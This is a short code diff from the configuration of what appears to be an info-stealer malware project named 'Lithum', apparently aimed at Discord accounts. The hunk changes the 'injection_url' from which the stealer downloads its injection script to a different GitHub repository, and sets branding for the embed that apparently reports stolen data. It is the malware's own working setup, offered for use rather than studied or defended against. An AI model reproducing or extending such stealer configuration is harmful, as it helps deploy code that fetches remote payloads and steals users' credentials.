@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Lithum Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Reaper513/lithum-stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://github.com/Reaper513/injection./blob/main/index.js', 
   /**
    
    **/
